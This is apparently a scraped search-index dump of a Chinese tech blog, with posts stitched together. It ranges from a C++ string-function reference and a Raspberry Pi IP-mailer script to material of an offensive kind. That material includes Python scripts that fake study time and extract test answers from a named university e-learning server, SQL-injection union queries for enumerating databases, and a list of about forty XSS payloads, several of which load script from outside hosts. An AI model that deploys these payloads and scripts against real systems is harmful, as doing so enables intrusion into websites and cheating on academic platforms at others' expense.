","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:0:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#c"},{"categories":["coding"],"content":"C++： \u003cstring\u003e string str; 字符串长度 len = str.length(); len = str.size(); 字符串比较 可以直接比较 也可以: str1.compare(str2); str1.compare(pos1,len1,str2,pos2,len2); //值为负，0 ，正。 //nops 长度到完。 附加 str1 += str2; 或 str1.append(str2); str1.append(str2.pos2,len2); 字符串提取 str2 = str1.substr(); str2 = str1.substr(pos1); str2 = str1.substr(pos1,len1); string a=s.substr(0,4); //获得字符串s中 从第0位开始的长度为4的字符串 字符串搜索 where = str1.find(str2); where = str1.find(str2,pos1); //pos1是从str1的第几位开始。 where = str1.rfind(str2); //从后往前搜。 插入字符串 不是赋值语句。 str1.insert(pos1,str2); str1.insert(pos1,str2,pos2,len2); str1.insert(pos1,numchar,char); //numchar是插入次数，char是要插入的字符。 替换字符串 str1.replace(pos1,str2); str1.replace(pos1,str2,pos2,len2); 删除字符串 str.erase(pos,len) str.clear(); 交换字符串 swap(str1,str2); C –\u003e C++ char *cstr = \"Hello\"; string str1; cstr = cstr; string str2(cstr); 对于ACMer来说，C的字符串处理要比C++的方便、简单，尽量用C的字符串处理函数。 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:0:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#c-1"},{"categories":["coding"],"content":"C++中string类常用算法 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:0:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#c中string类常用算法"},{"categories":["coding"],"content":"string类的构造函数： string(const char *s); //用c字符串s初始化 string(int n,char c); //用n个字符c初始化 此外，string类还支持默认构造函数和复制构造函数，如: string s1；string s2=\"hello\"； 都是正确的写法。 当构造的string太长而无法表达时会抛出length_error异常 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:1:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#string类的构造函数"},{"categories":["coding"],"content":"string类的字符操作： const char \u0026operator[](int n)const; const char \u0026at(int n)const; char \u0026operator[](int n); char \u0026at(int n); //operator[]和at()均返回当前字符串中第n个字符的位置，但at函数提供范围检查，当越界时会抛出out_of_range异常，下标运算符[]不提供检查访问。 const char *data()const;//返回一个非null终止的c字符数组 const char *c_str()const;//返回一个以null终止的c字符串 int copy(char *s, int n, int pos = 0) const;//把当前串中以pos开始的n个字符拷贝到以s为起始位置的字符数组中，返回实际拷贝的数目 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:2:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#string类的字符操作"},{"categories":["coding"],"content":"string的特性描述: int capacity()const; //返回当前容量（即string中不必增加内存即可存放的元素个数） int max_size()const; //返回string对象中可存放的最大字符串的长度 int size()const;//返回当前字符串的大小 int length()const; //返回当前字符串的长度 bool empty()const;//当前字符串是否为空 void resize(int len,char c);//把字符串当前大小置为len，并用字符c填充不足的 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:3:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#string的特性描述"},{"categories":["coding"],"content":"部分string类的输入输出操作: string类重载运算符operator\u003e\u003e//用于输入，同样重载运算符operator\u003c\u003c用于输出操作。函数getline(istream \u0026in,string \u0026s);//用于从输入流in中读取字符串到s中，以换行符'\\n'分开。 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:4:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#部分string类的输入输出操作"},{"categories":["coding"],"content":"string的赋值： string \u0026operator=(const string \u0026s);//把字符串s赋给当前字符串 string \u0026assign(const char *s);//用c类型字符串s赋值 string \u0026assign(const char *s,int n);//用c字符串s开始的n个字符赋值 string \u0026assign(const string \u0026s);//把字符串s赋给当前字符串 string \u0026assign(int n,char c);//用n个字符c赋值给当前字符串 string \u0026assign(const string \u0026s,int start,int n);//把字符串s中从start开始的n个字符赋给当前字符串 string \u0026assign(const_iterator first,const_itertor last);//把first和last迭代器之间的部分赋给字符串 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:5:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#string的赋值"},{"categories":["coding"],"content":"string的连接： //把字符串s连接到当前字符串的结尾 string \u0026operator+=(const string \u0026s); //把c类型字符串s连接到当前字符串结尾 string \u0026append(const char *s); //把c类型字符串s的前n个字符连接到当前字符串结尾 string \u0026append(const char *s,int n); //同operator+=() string \u0026append(const string \u0026s); //把字符串s中从pos开始的n个字符连接到当前字符串的结尾 string \u0026append(const string \u0026s,int pos,int n); //在当前字符串结尾添加n个字符c string \u0026append(int n,char c); //把迭代器first和last之间的部分连接到当前字符串的结尾 string \u0026append(const_iterator first,const_iterator last); ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:6:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#string的连接"},{"categories":["coding"],"content":"string的比较： //比较两个字符串是否相等运算符\"\u003e\",\"\u003c\",\"\u003e=\",\"\u003c=\",\"!=\"均被重载用于字符串的比较； bool perator==(const string \u0026s1,const string \u0026s2)const; //比较当前字符串和s的大小 int compare(const string \u0026s) const; //比较当前字符串从pos开始的n个字符组成的字符串与s的大小 int compare(int pos, int n,const string \u0026s)const; //比较当前字符串从pos开始的n个字符组成的字符串与s中pos2开始的n2个字符组成的字符串的大小 int compare(int pos, int n,const string \u0026s,int pos2,int n2)const; int compare(const char *s) const; int compare(int pos, int n,const char *s) const; int compare(int pos, int n,const char *s, int pos2) const; //compare函数在\u003e时返回1，\u003c时返回-1，==时返回0 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:7:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#string的比较"},{"categories":["coding"],"content":"string的子串： //返回pos开始的n个字符组成的字符串string的交换： string substr(int pos = 0,int n = npos) const; //交换当前字符串与s2的值 void swap(string \u0026s2); ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:8:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#string的子串"},{"categories":["coding"],"content":"string类的查找函数： //从pos开始查找字符c在当前字符串的位置 int find(char c, int pos = 0) const; //从pos开始查找字符串s在当前串中的位置 int find(const char *s, int pos = 0) const; //从pos开始查找字符串s中前n个字符在当前串中的位置 int find(const char *s, int pos, int n) const; //从pos开始查找字符串s在当前串中的位置 //查找成功时返回所在位置，失败返回string::npos的值 int find(const string \u0026s, int pos = 0) const; //从pos开始从后向前查找字符c在当前串中的位置 int rfind(char c, int pos = npos) const; int rfind(const char *s, int pos = npos) const; int rfind(const char *s, int pos, int n = npos) const; int rfind(const string \u0026s,int pos = npos) const; //从pos开始从后向前查找字符串s中前n个字符组成的字符串在当前串中的位置，成功返回所在位置，失败时返回string::npos的值 //从pos开始查找字符c第一次出现的位置 int find_first_of(char c, int pos = 0) const; int find_first_of(const char *s, int pos = 0) const; int find_first_of(const char *s, int pos, int n) const; int find_first_of(const string \u0026s,int pos = 0) const; //从pos开始查找当前串中第一个在s的前n个字符组成的数组里的字符的位置。查找失败返回string::npos int find_first_not_of(char c, int pos = 0) const; int find_first_not_of(const char *s, int pos = 0) const; int find_first_not_of(const char *s, int pos,int n) const; int find_first_not_of(const string \u0026s,int pos = 0) const; //从当前串中查找第一个不在串s中的字符出现的位置，失败返回string::npos int find_last_of(char c, int pos = npos) const; int find_last_of(const char *s, int pos = npos) const; int find_last_of(const char *s, int pos, int n = npos) const; int find_last_of(const string \u0026s,int pos = npos) const; int find_last_not_of(char c, int pos = npos) const; int find_last_not_of(const char *s, int pos = npos) const; int find_last_not_of(const char *s, int pos,int n) const; int find_last_not_of(const string \u0026s,int pos = npos) const; //find_last_of和find_last_not_of与find_first_of和find_first_not_of相似，只不过是从后向前查找 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:9:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#string类的查找函数"},{"categories":["coding"],"content":"string类的替换函数： //删除从p0开始的n0个字符，然后在p0处插入串s string \u0026replace(int p0, int n0,const char *s); //删除p0开始的n0个字符，然后在p0处插入字符串s的前n个字符 string \u0026replace(int p0, int n0,const char *s, int n); //删除从p0开始的n0个字符，然后在p0处插入串s string \u0026replace(int p0, int n0,const string \u0026s); //删除p0开始的n0个字符，然后在p0处插入串s中从pos开始的n个字符 string \u0026replace(int p0, int n0,const string \u0026s, int pos, int n); //删除p0开始的n0个字符，然后在p0处插入n个字符c string \u0026replace(int p0, int n0,int n, char c); //把[first0，last0）之间的部分替换为字符串s string \u0026replace(iterator first0, iterator last0,const char *s); //把[first0，last0）之间的部分替换为s的前n个字符 string \u0026replace(iterator first0, iterator last0,const char *s, int n); //把[first0，last0）之间的部分替换为串s string \u0026replace(iterator first0, iterator last0,const string \u0026s); //把[first0，last0）之间的部分替换为n个字符c string \u0026replace(iterator first0, iterator last0,int n, char c); //把[first0，last0）之间的部分替换成[first，last）之间的字符串string类的插入函： string \u0026replace(iterator first0, iterator last0,const_iterator first,const_iteratorlast); string \u0026insert(int p0, const char *s); string \u0026insert(int p0, const char *s, int n); string \u0026insert(int p0,const string \u0026s); string \u0026insert(int p0,const string \u0026s, int pos, int n); //前4个函数在p0位置插入字符串s中pos开始的前n个字符 //此函数在p0处插入n个字符c string \u0026insert(int p0, int n, char c); //在it处插入字符c，返回插入后迭代器的位置 iterator insert(iterator it, char c); //在it处插入[first，last）之间的字符 void insert(iterator it, const_iterator first, const_iterator last); //在it处插入n个字符c void insert(iterator it, int n, char c); ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:10:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#string类的替换函数"},{"categories":["coding"],"content":"string类的删除函数 //删除[first，last）之间的所有字符，返回删除后迭代器的位置 iterator erase(iterator first, iterator last); //删除it指向的字符，返回删除后迭代器的位置 iterator erase(iterator it); //删除pos开始的n个字符，返回修改后的字符串 string \u0026erase(int pos = 0, int n = npos); ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:11:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#string类的删除函数"},{"categories":["coding"],"content":"string类的迭代器处理： string类提供了向前和向后遍历的迭代器iterator，迭代器提供了访问各个字符的语法，类似于指针操作，迭代器不检查范围。 用string::iterator或string::const_iterator声明迭代器变量，const_iterator不允许改变迭代的内容。 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:12:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#string类的迭代器处理"},{"categories":["coding"],"content":"常用迭代器函数有： const_iterator begin()const; iterator begin(); //返回string的起始位置 const_iterator end()const; iterator end();//返回string的最后一个字符后面的位置 const_iterator rbegin()const; iterator rbegin(); //返回string的最后一个字符的位置 const_iterator rend()const; iterator rend();//返回string第一个字符位置的前面rbegin 和rend用于从后向前的迭代访问，通过设置迭代器 string::reverse_iterator,string::const_reverse_iterator实现 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:12:1","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#常用迭代器函数有"},{"categories":["coding"],"content":"字符串流处理： 通过定义ostringstream和istringstream变量实现，头文件中 ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:13:0","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#字符串流处理"},{"categories":["coding"],"content":"例如： string input(\"hello,this is a test\"); istringstream is(input); string s1,s2,s3,s4; is\u003e\u003es1\u003e\u003es2\u003e\u003es3\u003e\u003es4;//s1=\"hello,this\",s2=\"is\",s3=\"a\",s4=\"test\" ostringstream os; os\u003c\u003cs1\u003c\u003cs2\u003c\u003cs3\u003c\u003cs4; cout\u003c\u003cos.str(); ","date":"2018-12-03","objectID":"https://zu1k.com/posts/coding/c-cpp-string-op/:13:1","series":null,"tags":["c","c++"],"title":"c/c++字符串处理大集合","uri":"https://zu1k.com/posts/coding/c-cpp-string-op/#例如"},{"categories":["coding"],"content":"本脚本使用的是腾讯企业邮的smtp服务，可以根据需求进行相应修改 # coding:utf8 import email import smtplib import os from email.mime.text import MIMEText from email.mime.multipart import MIMEMultipart import socket class MyEmail: def __init__(self): self.user = None self.passwd = None self.to_list = [] self.cc_list = [] self.tag = None self.doc = None def send(self): ''' 发送邮件 ''' try: server = smtplib.SMTP_SSL(\"smtp.exmail.qq.com\", port=465) server.login(self.user, self.passwd) server.sendmail(\"\u003c%s\u003e\" % self.user, self.to_list, self.get_attach()) server.close() print \"send email successful\" except Exception, e: print \"send email failed %s\" % e45 def get_attach(self): ''' 构造邮件内容 ''' attach = MIMEMultipart() s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.connect((\"1.1.1.1\", 80)) txt = s.getsockname()[0] s.close() txt = MIMEText(txt) attach.attach(txt) if self.tag is not None: # 主题,最上面的一行 attach[\"Subject\"] = self.tag if self.user is not None: # 显示在发件人 attach[\"From\"] = \"PI\u003c%s\u003e\" % self.user if self.to_list: # 收件人列表 attach[\"To\"] = \";\".join(self.to_list) if self.cc_list: # 抄送列表 attach[\"Cc\"] = \";\".join(self.cc_list) if self.doc: # 估计任何文件都可以用base64，比如rar等 # 文件名汉字用gbk编码代替 name = os.path.basename(self.doc).encode(\"gbk\") f = open(self.doc, \"rb\") doc = MIMEText(f.read(), \"base64\", \"gb2312\") doc[\"Content-Type\"] = 'application/octet-stream' doc[\"Content-Disposition\"] = 'attachment; filename=\"' + name + '\"' attach.attach(doc) f.close() return attach.as_string() if __name__ == \"__main__\": my = MyEmail() my.user = \"username@example.com\" my.passwd = \"password\" my.to_list = [\"username@126.com\", ] my.cc_list = [\"\", ] my.tag = \"PI IP\" my.doc = None #u\"C:\\Documents and Settings\\Administrator\\Desktop\\日报.doc\" my.send() ","date":"2018-10-14","objectID":"https://zu1k.com/posts/linux/raspberry-pi-boot-script-to-send-ip-to-specified-email/:0:0","series":null,"tags":["python","树莓派"],"title":"树莓派开机发送IP到指定邮箱的脚本","uri":"https://zu1k.com/posts/linux/raspberry-pi-boot-script-to-send-ip-to-specified-email/#"},{"categories":["coding"],"content":"这是我们学校用的平台，自己写了一个脚本，可以用来刷时间，可以多开同时刷。 20分钟刷一册书不是问题。 有需要的拿去，随便改改就能用。 import requests import random import time root = \"http://202.194.7.18/NPlearning\" timeurl = root+\"/Student/LogTime.aspx\" studyurl = root+\"/student/CourseStudy.aspx\" ctoken = None s = requests.session() ua = {\"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0\"} s.headers.update(ua) s.get(root) def randomnocache(): return str(random.random()) #登陆账号 def login(username,password): data = \"__EVENTTARGET=\u0026__EVENTARGUMENT=\u0026__VIEWSTATE=%2FwEPDwULLTE2NTQ5MDE2NTlkZAPwlkpH14E6NeK5kuxpWcxRlhG6\u0026tbName=\"+username+\"\u0026tbPwd=\"+password+\"\u0026btnLogin=%E7%99%BB+%E5%BD%95\" headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en-US;q=0.7,en;q=0.3\", \"Referer\": \"http://202.194.7.18/NPlearning/login.aspx\", \"Content-Type\": \"application/x-www-form-urlencoded\", } t = s.post(root+\"/login.aspx\", data = data, headers = headers) print(\"登陆成功\") ctoken = t.text[t.text.find(\"InitToken('\") + 11:t.text.find(\"InitToken('\") + 49] # 添加了cookies c = requests.cookies.RequestsCookieJar() # 定义一个cookie对象 c.set('TimeRecordEnabled', 'true') # 增加cookie的值 s.cookies.update(c) # 更新s的cookie c.set('ctoken', ctoken) s.cookies.update(c) #访问http://202.194.7.18/NPlearning/studentdefault.aspx，不知道作用是什么，没有返回任何东西，但是添加了cookies，估计是向服务器记录什么 s.get(root+\"/studentdefault.aspx\") # 1.学习课程 def couseStudy(book,unit): data = \"t=studyunit\u0026c=2017-0002-0033\u0026m=College_English_NEW_SecEdition_Integrated_3\u0026u=Unit_0\"+str(unit)+\"\u0026nocache=\"+randomnocache() headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en-US;q=0.7,en;q=0.3\", \"Referer\": \"http://202.194.7.18/NPlearning/student/CourseIndex.aspx?c=2017-0002-0033\u0026m=College_English_NEW_SecEdition_Integrated_3\", \"Content-Type\": \"application/x-www-form-urlencoded\", } s.get(studyurl,data=data,headers=headers) # 2.检查授权 def checkauthorize(): data=\"logType=checkneedauthorize\u0026material=College_English_NEW_SecEdition_Integrated_3\u0026nocache=\"+randomnocache() headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en-US;q=0.7,en;q=0.3\", \"Referer\": \"http://202.194.7.18/NPlearning/student/CourseStudy.aspx?t=studyunit\u0026c=2017-0002-0033\u0026m=College_English_NEW_SecEdition_Integrated_3\u0026u=Unit_02\u0026nocache=\"+randomnocache(), \"Content-Type\": \"application/x-www-form-urlencoded\", } ok = s.get(timeurl,data=data,headers=headers) # 3.不知道用来干啥用的方法 def getcomment(book,unit): data = \"logType=getcomment\u0026classno=2017-0002-0033\u0026material=College_English_NEW_SecEdition_Integrated_3\u0026unit=Unit_0\"+str(unit)+\"\u0026nocache=\"+randomnocache() headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en-US;q=0.7,en;q=0.3\", \"Referer\": \"http://202.194.7.18/NPlearning/student/CourseStudy.aspx?t=studyunit\u0026c=2017-0002-0033\u0026m=College_English_NEW_SecEdition_Integrated_3\u0026u=Unit_0\"+str(unit)+\"\u0026nocache=\"+randomnocache(), \"Content-Type\": \"application/x-www-form-urlencoded\", } s.get(timeurl,data=data,headers=headers) #获取服务器时间 def getServerTime(): data = \"logType=getservertime\u0026nocache=\" + randomnocache() headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en-US;q=0.7,en;q=0.3\", \"Referer\": \"http://202.194.7.18/NPlearning/studentdefault.aspx\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"X-Requested-With\": \"XMLHttpRequest\", } servertime = s.get(timeurl,data=data,headers=headers) return servertime.text # 4.开始记录时间 def startNewStatTime(book,unit): data = \"logType=startnewstattime\u0026stattype=1\u0026material=\"+\"College_English_NEW_SecEdition_Integrated_3\u0026unit=unit_0\"+str(unit)+\"\u0026class=2017-0002-0033\u0026nocache=\"+randomnocache() headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en-US;q=0.7,en;q=0.3\", \"Referer\": \"http://202.194.7.18/NPlearning/studentdefault.aspx\"","date":"2018-10-14","objectID":"https://zu1k.com/posts/coding/new-concept-foreign-language-online-teaching-platform-script/:0:0","series":null,"tags":["coding","python"],"title":"新理念外语网络教学平台脚本刷时长","uri":"https://zu1k.com/posts/coding/new-concept-foreign-language-online-teaching-platform-script/#"},{"categories":null,"content":"查询用户名，数据库名，数据库版本信息： union select 1,2,(concat_ws(char(32,58,32),user(),database(),version())) %23 查询所有数据库名 union select 1,schema_name from information_schema.schemata 查询一个库中所有的表的名字 union select group_concat(char(32),table_name,char(32)) from information_schema.tables where table_schema=0x7365637572697479 %23 注意。在系统自带的表中查东西，where后面的值应该是单引号包裹或者16进制编码，通常用16进制 union select 1,table_name from information_schema.tables where table_schema='my_db' 查询一个表中所有列的名字 union select group_concat(char(32),table_name,char(32)) from information_schema.COLUMNS where table_schema=0x7365637572697479 %23 union select 1,column_name from information_schema.columns where table_schema='my_db' ","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/sql-to-select-some-base-info/:0:0","series":null,"tags":["sql"],"title":"查询重要数据的sql语句","uri":"https://zu1k.com/posts/security/web-security/sql-to-select-some-base-info/#"},{"categories":["coding"],"content":"给大家哦分享一个获取任意答案的脚本。 import random import requests root = \"http://202.194.7.18/NPlearning\" answerurl=root+\"/Student/ViewTestTask.aspx\" ctoken = None s = requests.session() ua = {\"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0\"} s.headers.update(ua) s.get(root) def login(username,password): data = \"__EVENTTARGET=\u0026__EVENTARGUMENT=\u0026__VIEWSTATE=%2FwEPDwULLTE2NTQ5MDE2NTlkZAPwlkpH14E6NeK5kuxpWcxRlhG6\u0026tbName=\"+username+\"\u0026tbPwd=\"+password+\"\u0026btnLogin=%E7%99%BB+%E5%BD%95\" headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en-US;q=0.7,en;q=0.3\", \"Referer\": \"http://202.194.7.18/NPlearning/login.aspx\", \"Content-Type\": \"application/x-www-form-urlencoded\", } t = s.post(root+\"/login.aspx\", data = data, headers = headers) print(\"登陆成功\") ctoken = t.text[t.text.find(\"InitToken('\") + 11:t.text.find(\"InitToken('\") + 49] c = requests.cookies.RequestsCookieJar() c.set('ctoken', ctoken) s.cookies.update(c) s.get(root+\"/studentdefault.aspx\") def randomnocache(): return str(random.random()) def getanswer(part,ttid,sheetid,sttid): data = \"action=getPart\u0026partnum=\"+str(part)+\"\u0026ttid=\"+str(ttid)+\"\u0026sheetid=\"+str(sheetid)+\"\u0026sttid=\"+str(sttid)+\"\u0026nocache=\"+randomnocache() headers = { \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,en-US;q=0.7,en;q=0.3\", \"Referer\": \"http://202.194.7.18/NPlearning/student/ViewTestTask.aspx\", \"Content-Type\": \"application/x-www-form-urlencoded\", } ans=s.post(url=answerurl,data=data,headers=headers) if ans.text.find(\"服务器错误\")==-1: return ans.text def answer(ttid,sheetid,sttid): fo = open(\"D://EnglishAnswer.html\",\"a+\") fo.write(getanswer(1, ttid,sheetid,sttid)) fo.write(getanswer(2, ttid, sheetid, sttid)) fo.write(getanswer(3, ttid, sheetid, sttid)) fo.write(getanswer(4, ttid, sheetid, sttid)) fo.close() login(\"20170030****\",\"8*******\") #这里输入大家自己的账号密码 answer(7707,1634,289502) #这里需要输入获取到的ttid,sheetid,sttid.这三个参数是开始做题才分配的，需要大家自己找 最终的答案是一个html文件，存在D盘根目录，名称EnglishAnswer.html,直接双击用浏览器打开就可以。 后续补充：有时候网页中会出现个别字符导致文件写入编码方式出错，请自己使用replace函数移除相应字符。 ","date":"2018-10-14","objectID":"https://zu1k.com/posts/coding/new-concept-foreign-language-online-teaching-platform-to-get-arbitrary-answers/:0:0","series":null,"tags":["python"],"title":"新理念外语网络教学平台获取任意答案","uri":"https://zu1k.com/posts/coding/new-concept-foreign-language-online-teaching-platform-to-get-arbitrary-answers/#"},{"categories":["web-security"],"content":"总结了常用的xss payload 1.普通的XSS JavaScript注入 \u003cSCRIPT SRC=http://3w.org/XSS/xss.js\u003e\u003c/SCRIPT\u003e 2.IMG标签XSS使用JavaScript命令 \u003cIMG SRC=1 ONERROR=alert('XSS')\u003e 3.IMG标签无分号无引号 \u003cIMG SRC=javascript:alert('XSS')\u003e 4.IMG标签大小写不敏感 \u003cIMG SRC=JaVaScRiPt:alert('XSS')\u003e 5.HTML编码(必须有分号) \u003cIMG SRC=javascript:alert(\"XSS\")\u003e 6.修正缺陷IMG标签 \u003cIMG \"\"\"\u003e\u003cSCRIPT\u003ealert(\"XSS\")\u003c/SCRIPT\u003e\"\u003e 7.formCharCode标签(计算器) \u003cIMG SRC=javascript:alert(String.fromCharCode(88,83,83))\u003e 8.UTF-8的Unicode编码(计算器) \u003cIMG SRC=jav..省略..S')\u003e 9.7位的UTF-8的Unicode编码是没有分号的(计算器) \u003cIMG SRC=jav..省略..S')\u003e 10.十六进制编码也是没有分号(计算器) \u003cIMG SRC=\u0026#x6A\u0026#x61\u0026#x76\u0026#x61..省略..\u0026#x58\u0026#x53\u0026#x53\u0026#x27\u0026#x29\u003e 11.嵌入式标签,将Javascript分开 \u003cIMG SRC=\"jav ascript:alert('XSS');\"\u003e 12.嵌入式编码标签,将Javascript分开 \u003cIMG SRC=\"jav ascript:alert('XSS');\"\u003e 13.嵌入式换行符 \u003cIMG SRC=\"jav ascript:alert('XSS');\"\u003e 14.嵌入式回车 \u003cIMG SRC=\"jav ascript:alert('XSS');\"\u003e 15.嵌入式多行注入JavaScript,这是XSS极端的例子 \u003cIMG SRC=\"javascript:alert('XSS')\"\u003e 16.解决限制字符(要求同页面) \u003cscript\u003ez='document.'\u003c/script\u003e \u003cscript\u003ez=z+'write(\"'\u003c/script\u003e \u003cscript\u003ez=z+'\u003cscript'\u003c/script\u003e \u003cscript\u003ez=z+' src=ht'\u003c/script\u003e \u003cscript\u003ez=z+'tp://ww'\u003c/script\u003e \u003cscript\u003ez=z+'w.shell'\u003c/script\u003e \u003cscript\u003ez=z+'.net/1.'\u003c/script\u003e \u003cscript\u003ez=z+'js\u003e\u003c/sc'\u003c/script\u003e \u003cscript\u003ez=z+'ript\u003e\")'\u003c/script\u003e \u003cscript\u003eeval_r(z)\u003c/script\u003e 17.空字符 perl -e 'print \"\u003cIMG SRC=java\\0script:alert(\\\"XSS\\\")\u003e\";' \u003e out 18.空字符2,空字符在国内基本没效果.因为没有地方可以利用 perl -e 'print \"\u003cSCR\\0IPT\u003ealert(\\\"XSS\\\")\u003c/SCR\\0IPT\u003e\";' \u003e out 19.Spaces和meta前的IMG标签 \u003cIMG SRC=\" javascript:alert('XSS');\"\u003e 20.Non-alpha-non-digit XSS \u003cSCRIPT/XSS SRC=\"http://3w.org/XSS/xss.js\"\u003e\u003c/SCRIPT\u003e 21.Non-alpha-non-digit XSS to 2 \u003cBODY onload!#$%\u0026()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")\u003e 22.Non-alpha-non-digit XSS to 3 \u003cSCRIPT/SRC=\"http://3w.org/XSS/xss.js\"\u003e\u003c/SCRIPT\u003e 23.双开括号 \u003c\u003cSCRIPT\u003ealert(a.sourse);//\u003c\u003c/SCRIPT\u003e 24.无结束脚本标记(仅火狐等浏览器) \u003cSCRIPT SRC=http://3w.org/XSS/xss.js?\u003cB\u003e 25.无结束脚本标记 \u003cSCRIPT SRC=//3w.org/XSS/xss.js\u003e 26.半开的HTML/JavaScript XSS \u003cIMG SRC=\"javascript:alert('XSS')\" 27.双开角括号 \u003ciframe src=http://3w.org/XSS.html \u003e 28.无单引号、双引号、分号 \u003cSCRIPT\u003ea=/XSS/ alert(a.source)\u003c/SCRIPT\u003e 29.换码过滤的JavaScript \\\";alert('XSS');// 30.结束Title标签 \u003c/TITLE\u003e\u003cSCRIPT\u003ealert(\"XSS\");\u003c/SCRIPT\u003e 31.Input Image \u003cINPUT SRC=\"javascript:alert('XSS');\"\u003e 32.BODY Image \u003cBODY BACKGROUND=\"javascript:alert('XSS')\"\u003e 33.BODY标签 \u003cBODY('XSS')\u003e 34.IMG Dynsrc \u003cIMG DYNSRC=\"javascript:alert('XSS')\"\u003e 35.IMG Lowsrc \u003cIMG LOWSRC=\"javascript:alert('XSS')\"\u003e 36.BGSOUND \u003cBGSOUND SRC=\"javascript:alert('XSS');\"\u003e 37.STYLE sheet \u003cLINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\"\u003e 38.远程样式表 \u003cLINK REL=\"stylesheet\" HREF=\"http://3w.org/xss.css\"\u003e 39.List-style-image(列表式) \u003cSTYLE\u003eli {list-style-image: url(\"javascript:alert('XSS')\");}\u003c/STYLE\u003e\u003cUL\u003e\u003cLI\u003eXSS 40.IMG VBscript \u003cIMG SRC='vbscript:msgbox(\"XSS\")'\u003e\u003c/STYLE\u003e\u003cUL\u003e\u003cLI\u003eXSS","date":"2018-10-14","objectID":"https://zu1k.com/posts/security/web-security/xss-payload/:0:0","series":null,"tags":["XSS","Payload","web-security"],"title":"xss payload","uri":"https://zu1k.com/posts/security/web-security/xss-payload/#"},{"categories":["web-security"],"content":"PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 